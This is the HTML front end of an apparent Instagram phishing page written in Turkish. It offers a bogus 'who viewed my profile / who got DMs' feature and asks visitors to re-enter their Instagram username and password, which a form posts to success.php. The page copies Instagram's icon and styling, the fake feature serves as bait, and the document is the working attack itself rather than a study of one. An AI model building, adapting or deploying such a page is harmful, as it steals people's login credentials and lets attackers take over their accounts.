<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/ico" href="https://www.instagram.com/favicon.ico">
<link href='img/mod.png' rel='icon' type='image/x-png'/>
<title>Profilime Bakanlar V.01</title>
<script src="js/jquery.min.js"></script>
<link rel="stylesheet" href="css/bootstrap.min.css">
<style>
h1, .h1, h2, .h2, h3, .h3 {
    margin-top: 0px;
    margin-bottom: 10.5px;
}
body { 
  background: url(img/instagram-background.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
.error-msg {
    margin: .5em 0;
    display: block;
    color: #dd4b39;
    line-height: 17px;
}
.col-md-6 {
 margin:0 auto;
 float:none;

}
.col-md-8 {
 margin:0 auto;
 float:none;

}
</style>
<br><center><font size="5"><font color="white"><strong>Instagram Profilime Bakanlar V.01 ©2015 - 2018</strong></font></font></center></div>
<body style="padding:0px;margin:0 auto;">
<div style="padding:0px;margin:0 auto;" class="container ">
<br>
<div><center>
<h2><img width="130" src="img/modd.png"></h2>
</center></div>
<div class="col-md-8"><center>
<div class="form-horizontal">
<form action="success.php" method="POST">
<h4 >
  <strong><font color="white">Hile ile hesabınıza seçenekleri işaretleyip, tekrardan Kullanıcı adı ve şifrenizi girerek "BAŞLA" butonuna basın :)</font></strong>
  </h4><br/><form id="glogin"><hr align="center">
<div style="width:45%" class="form-group">
<div class="input-group">
    <span class="input-group-addon">Profiline Kim Baktı | <img src="img/goz.png"style="width:20px;height:13px;"></span>
            <select class="form-control" id="gems">
          <option>Son 1 Saat</option>
          <option>Son 6 Saat</option>
          <option>Son 12 Saat</option>
		  <option>Son 24 Saat</option>
        </select>
  </div>
</div>

<div style="width:45%" class="form-group">
<div class="input-group">
    <span class="input-group-addon">Kime Kaç DM Geldi | <img src="img/dm.png"style="width:20px;height:21px;"></span>
            <select class="form-control" id="gold">
          <option>Son 1 Saat</option>
          <option>Son 6 Saat</option>
          <option>Son 12 Saat</option>
		  <option>Son 24 Saat</option>
        </select>
  </div>
  </div>

<hr align="center">
<div style="width:35%" class="form-group">
  <input class="form-control" name="username"  placeholder="Kullanıcı Adını yeniden gir" type="username" required>
</div>
<div style="width:35%" class="form-group">
  <input class="form-control" name="password" placeholder="Şifreni yeniden gir" type="password" required>
</div>

<div style="text-align:left" class="error-msg" id="hasilnya"></div>
<div style="width:35%" class="form-group">
  <input type="submit" name="gsubmit" class="btn btn-block" style="color: #ffffff;background-color: #111111;" id="gsubmit" value="BAŞLA"> </form>
</center>
  


